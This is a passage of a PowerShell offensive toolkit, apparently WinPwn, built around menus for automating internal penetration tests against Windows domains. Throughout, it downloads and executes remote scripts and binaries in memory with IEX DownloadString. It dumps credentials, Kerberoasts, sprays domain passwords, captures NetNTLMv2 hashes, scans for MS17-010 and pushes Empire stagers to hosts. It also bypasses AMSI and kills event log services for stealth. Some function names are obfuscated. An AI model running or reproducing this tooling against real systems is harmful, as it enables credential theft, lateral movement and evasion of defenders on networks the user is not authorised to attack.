                            		echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
                        	}
				}catch{Write-Host "Got an error"}
                    	}
            }
                    
	        }
	                    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
    @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Localreconmodules

'@
    
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Collect general domain information!'
        Write-Host -ForegroundColor Green '2. Search for potential sensitive domain share files! '
        Write-Host -ForegroundColor Green '3. Starting ACLAnalysis for Shadow Admin detection! '
        Write-Host -ForegroundColor Green '4. Start MS-RPRN RPC Service Scan! '
        Write-Host -ForegroundColor Green '5. Start PowerUpSQL Checks!'
        Write-Host -ForegroundColor Green '6. Search for MS17-10 vulnerable Windows Servers in the domain! '
        Write-Host -ForegroundColor Green '7. Check Domain Network-Shares for cleartext passwords using passhunt.exe! '
        Write-Host -ForegroundColor Green '8. Check domain Group policies for common misconfigurations using Grouper2! '
        Write-Host -ForegroundColor Green '9. Exit. '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{generaldomaininfo}
             2{Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
             3{invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'}
             4{spoolvulnscan}
             5{powerSQL}
             6{MS17-10}
             7{passhunt -domain $true}
             8{GPOAudit}
       }
    }
 While ($masterquestion -ne 9)
}

function GPOAudit
{
<#
        .DESCRIPTION
        Check Group Policies for common misconfigurations using Grouper2.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/Grouper2.exe?raw=true -argument1 "-f" -argument2 "$currentPath\DomainRecon\GPOAudit.html"
}


function reconAD
{
    pathcheck
    Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
    Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
    cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
}

function MS17-10
{
<#
        .DESCRIPTION
        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement / Exploitation Phase
    pathcheck
    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/ms17-10.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
    $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
    {
	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
	foreach ($acserver in $ActiveServers.dnshostname)
        {
		try{
         	if (Scan-MS17-10 -target $acserver)
                {
                	Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. Just Pwn this system!'
                        echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableServers.txt"
                }
		}catch{Write-Host "Got an error"}
        }
    }
    else
    {
    	Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
	$ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
	foreach ($acserver in $ActiveServers.dnshostname)
        {
		try{
         	if (Scan-MS17-10 -target $acserver)
                {
                	Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
                        echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableSystems.txt"
                }
		}catch{Write-Host "Got an error"}
        }
    }

}

function powerSQL
{
<#
        .DESCRIPTION
        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
   
    Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/PowerUpSQL.ps1')
    Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"
    
    Write-Host -ForegroundColor Yellow 'Checking login with the current user Account:'
    $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
    $Targets >> "$currentPath\DomainRecon\SQLServer_Accessible.txt"
    $Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"
    
    Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
    Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\Vulnerabilities\SQLServer_DefaultLogin.txt"
    
    Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
    foreach ($line in $Targets.Instance)
    {
        Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
        Invoke-SQLDumpInfo -Verbose -Instance $line $line >> "$currentPath\DomainRecon\SQLServer_Accessible_DumpInformation.txt"
        Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\Vulnerabilities\SQLServer_Accessible_Audit_$Targets.Computername.txt"
        mkdir "$currentPath\DomainRecon\SQLInfoDumps"
        $Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
    }
    Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
    move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
    $uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'
    if ($uncpath -eq "yes" -or $uncpath -eq "y" -or $uncpath -eq "Yes" -or $uncpath -eq "Y")
    {
        $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network? (If not we can start inveigh) - (yes/no)'
        if ($responder -eq "yes" -or $responder -eq "y" -or $responder -eq "Yes" -or $responder -eq "Y")
        {
            $smbip = Read-Host -Prompt 'Please enter the IP-Address of the hash capturing Network Interface:'
        }
        else
        {
            $smbip = Get-currentIP
            Inveigh
        }
	    Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress    
	}
    # XP_Cmdshell functions follow - maybe.
	      
}

function Get-currentIP
{
<#
        .DESCRIPTION
        Gets the current active IP-Address configuration.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
    $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}
    return $IPaddress
}

function sharphound
{
<#
        .DESCRIPTION
        Downloads Sharphound.exe and collects All AD-Information for Bloodhound.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
    $Wcl = new-object System.Net.WebClient
    $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    Invoke-WebRequest -Uri 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -Outfile "$currentPath\Domainrecon\Sharphound.exe"
    
    Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
    .\DomainRecon\Sharphound.exe -c All

}

function privescmodules
{
<#
        .DESCRIPTION
        All privesc scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/locksher.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/UpPower.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/GPpass.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/AutoGP.ps1')
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')

    Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
    Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt

    Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'

    Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
    amazon >> $currentPath\Vulnerabilities\GPP_Auto.txt
    Shockley >> $currentPath\Vulnerabilities\GPP_Passwords.txt

    Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
    families >> $currentPath\Vulnerabilities\All_Localchecks.txt

    Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
    proportioned >> $currentPath\Vulnerabilities\Sherlock_Vulns.txt
    
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/IkeextCheck.ps1')
    Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
    
}

function lazagnemodule
{
    <#
        .DESCRIPTION
        Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
    if (Test-Path $currentPath\WinCreds.exe)
    {
        Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
	mkdir $currentPath\Lazagne
        "$currentPath\WinCreds.exe all" >> $currentPath\Lazagne\Passwords.txt
        Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
    }
    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy:'}
}

function latmov
{
    <#
        .DESCRIPTION
        Looks for administrative Access on any system in the current network/domain. If Admin Access is available somewhere, Credentials can be dumped remotely / alternatively Powershell_Empire Stager can be executed.
        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Lateral Movement Phase
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/masskittie.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
    $domain_Name = Get-NetDomain
    $Domain = $domain_Name.Name
    
    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'

    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'

    fuller >> $currentPath\Exploitation\LocalAdminAccess.txt

    $exploitdecision = Read-Host -Prompt 'Do you want to Dump Credentials on all found Systems or Execute Empire Stager? (dump/empire)'
    if ($exploitdecision -eq "dump" -or $exploitdecision -eq "kittie" -or $exploitdecision -eq "Credentials")
    {
        #Masskittie
        $masskittie = Read-Host -Prompt 'Do you want to use Masskittie for all found Systems? (yes/no)'
        if ($masskittie -eq "yes" -or $masskittie -eq "y" -or $masskittie -eq "Yes" -or $masskittie -eq "Y")
        {
           if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
           {
               bookmobile -sILeZZaOSNUwrt9 $currentPath\Exploitation\LocalAdminAccess.txt >> $currentPath\Exploitation\PwnedSystems_Credentials.txt
           }
           else { Write-Host -ForegroundColor Red 'No Systems with admin-Privileges found in this domain' }
        }
    }
    elseif ($exploitdecision -eq "empire" -or $exploitdecision -eq "RAT")
    {
        empirelauncher
    }
    #Domainspray
    $domainspray = Read-Host -Prompt 'Do you want to Spray the Network with prepared Credentials? (yes/no)'
    if ($domainspray -eq "yes" -or $domainspray -eq "y" -or $domainspray -eq "Yes" -or $domainspray -eq "Y")
    {

       if (Test-Path $currentPath\passlist.txt) 
        {
            Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
        }
        else 
        { 
           Write-Host -ForegroundColor Red 'There is no passlist.txt File in the current folder'
           $passlist = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'
           $passlist >> $currentPath\passlist.txt
           Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt  
        }
    }
}

function empirelauncher
{
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/wmicmd.ps1')
    if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
    {
        $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
    }
    else
    {
        $file = "$currentPath\Exploitation\Exploited_Empire.txt"
        While($i -ne "quit") 
        {
	        If ($i -ne $NULL) 
            {
		        $i.Trim() | Out-File $file -append
	        }
	        $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target:'    
        }

    }

    $stagerfile = "$currentPath\Exploitation\Empire_Stager.txt"
    While($Payload -ne "quit") 
    {
	    If ($Payload -ne $NULL) 
        {
	        $Payload.Trim() | Out-File $stagerfile -append
	    }
        $Payload = Read-Host -Prompt 'Please provide the powershell Empire Stager payload (beginning with "powershell -noP -sta -w 1 -enc  BASE64Code") :'
    }
    
    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'

    if (Test-Path $currentPath\Exploitation\Exploited_Empire.txt)
    {
        $Hosts = Get-Content "$currentPath\Exploitation\Exploited_Empire.txt"
    }
    else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}

    if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
    {
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload
    }
    else 
    {
        $Credential = Get-Credential
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential
    }
}

function shareenumeration
{
    <#
        .DESCRIPTION
        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
    Claire >> $currentPath\SensitiveFiles.txt
    shift -qgsNZggitoinaTA >> $currentPath\Networkshares.txt
}

function groupsearch
{
    <#
        .DESCRIPTION
        AD can be searched for specific User/Group Relations over Group Policies.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
            if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Please enter a username to search for:'
                $username = Get-Credential
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
            }
            else
            {
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
                Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\Groupsearches.txt:'
            }
}

function proxydetect
{
    <#
        .DESCRIPTION
        Checks, if a proxy is active. Uses current users credentials for Proxy Access / other user input is possible as well.
        Author: @securethisshit
        License: BSD 3-Clause
    #>    
    #Proxy Detect #1
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'

    $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
    $regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")

    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))
    {
        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is: '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights? (yes/no)'
        if ($proxy -eq "yes" -or $proxy -eq "y" -or $proxy -eq "Yes" -or $proxy -eq "Y")
        {
             #Proxy
            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
            $Wcl = new-object System.Net.WebClient
            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'
            #Proxy Integration manual user
            $webclient=New-Object System.Net.WebClient
            $creds=Get-Credential
            $webclient.Proxy.Credentials=$creds
        }
   }
    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
}

function kerberoasting
{
    #Exploitation Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
    Write-Host -ForegroundColor Red 'Kerberoasting active:'
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')    
    Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .\Exploitation\'
	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 asreproast -argument2 "/format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 kerberoast -argument2 "/format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
    Write-Host -ForegroundColor Yellow 'Using the powershell version for sure'
    cmd /c start powershell -Command {$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat | fl >> $currentPath\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}
}

function inv-phantom {
    if (isadmin)
    {
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/phantom.ps1')
        phantom
    }
    else { Write-Host -ForegroundColor Yellow 'You are not admin, do something else for example privesc :-P'}
}

Function Get-Installedsoftware {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(ValueFromPipeline              =$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0
        )]
        [string[]]
            $ComputerName = $env:COMPUTERNAME,
        [Parameter(Position=0)]
        [string[]]
            $Property,
        [string[]]
            $IncludeProgram,
        [string[]]
            $ExcludeProgram,
        [switch]
            $ProgramRegExMatch,
        [switch]
            $LastAccessTime,
        [switch]
            $ExcludeSimilar,
        [int]
            $SimilarWord
    )

    begin {
        $RegistryLocation = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\',
                            'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\'

        if ($psversiontable.psversion.major -gt 2) {
            $HashProperty = [ordered]@{}    
        } else {
            $HashProperty = @{}
            $SelectProperty = @('ComputerName','ProgramName')
            if ($Property) {
                $SelectProperty += $Property
            }
            if ($LastAccessTime) {
                $SelectProperty += 'LastAccessTime'
            }
        }
    }

    process {
        foreach ($Computer in $ComputerName) {
            try {
                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)
                if ($socket.Connected) {
                    $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Computer)
                    $RegistryLocation | ForEach-Object {
                        $CurrentReg = $_
                        if ($RegBase) {
                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)
                            if ($CurrentRegKey) {
                                $CurrentRegKey.GetSubKeyNames() | ForEach-Object {
                                    $HashProperty.ComputerName = $Computer
                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('DisplayName'))
                                    
                                    if ($IncludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notmatch $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notlike $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($ExcludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -match $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -like $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($DisplayName) {
                                        if ($Property) {
                                            foreach ($CurrentProperty in $Property) {
                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue($CurrentProperty)
                                            }
                                        }
                                        if ($LastAccessTime) {
                                            $InstallPath = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('InstallLocation') -replace '\\$',''
                                            if ($InstallPath) {
                                                $WmiSplat = @{
                                                    ComputerName = $Computer
                                                    Query        = $("ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile")
                                                    ErrorAction  = 'SilentlyContinue'
                                                }
                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat |
                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} |
                                                    Sort-Object -Property LastAccessed |
                                                    Select-Object -Last 1 | ForEach-Object {
                                                        $_.ConvertToDateTime($_.LastAccessed)
                                                    }
                                            } else {
                                                $HashProperty.LastAccessTime = $null
                                            }
                                        }
                                        
                                        if ($psversiontable.psversion.major -gt 2) {
                                            [pscustomobject]$HashProperty
                                        } else {
                                            New-Object -TypeName PSCustomObject -Property $HashProperty |
                                            Select-Object -Property $SelectProperty
                                        }
                                    }
                                    $socket.Close()
                                }

                            }

                        }

                    }
                }
            } catch {
                Write-Error $_
            }
        }
    }
}

function fruit
{
    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
}
    
function WinPwn
{
    <#
        .DESCRIPTION
        Main Function. Executes the other functions according to the users input.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
@'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Automate some internal Penetrationtest processes

'@
    dependencychecks
    AmsiBypass

    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '
        Write-Host -ForegroundColor Green '2. Start local recon modules! '
        Write-Host -ForegroundColor Green '3. Start domain recon modules! '
        Write-Host -ForegroundColor Green '4. Try to escalate my local privileges! '
        Write-Host -ForegroundColor Green '5. Kerberoast some service accounts! '
        Write-Host -ForegroundColor Green '6. Search for SQL Servers in the domain and pwn them if possible! '
        Write-Host -ForegroundColor Green '7. Collect Bloodhound information! '
        Write-Host -ForegroundColor Green '8. Search for MS17-10 vulnerable Servers / Clients in this domain! '
        Write-Host -ForegroundColor Green '9. Give me some Credentials, now! '
        Write-Host -ForegroundColor Green '10. Search for Systems with Admin-Access to pwn them! '
        Write-Host -ForegroundColor Green '11. Create an ADIDNS Wildcard for ultimate mitm in all networks! '
        Write-Host -ForegroundColor Green '12. Execute Sessiongopher! '
        Write-Host -ForegroundColor Green '13. I want to check some remote system groups via GPO Mapping! '
        Write-Host -ForegroundColor Green '14. I am local admin, kill the event log services for stealth! '
        Write-Host -ForegroundColor Green '15. Search for passwords on this system! '
        Write-Host -ForegroundColor Green '16. Just one ADRecon Report for me! '
        Write-Host -ForegroundColor Green '17. Search for potential vulnerable web apps (low hanging fruits)! '
        Write-Host -ForegroundColor Green '18. Find some network shares! '
	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
	Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
    	Write-Host -ForegroundColor Green '21. Do an Group Policy Audit using Grouper2!'
        Write-Host -ForegroundColor Green '22. Exit. '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{Inveigh}
             2{localreconmodules}
             3{domainreconmodules}
             4{privescmodules}
             5{kerberoasting}
             6{powerSQL}
             7{Sharphound}
             8{MS17-10}
             9{kittielocal}
            10{latmov}
            11{adidnswildcard}
            12{sessionGopher}
            13{groupsearch}
            14{inv-phantom}
            15{passhunt}
            16{reconAD}
            17{fruit}
            18{sharenumeration}
	    19{sharpcradle -allthosedotnet $true}
	    20{sharpcradle}
            21{GPOAudit}
       }
    }
 While ($masterquestion -ne 22)
     
    
    #End
    Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Check the Property field of AD-Users for Passwords. Network Shares and Passwords in them can lead to success! Try Responder/Inveigh and SMB-Relaying! ADIDNS is a good addition for the whole network. Crack Kerberoasting Hashes.'
    
}
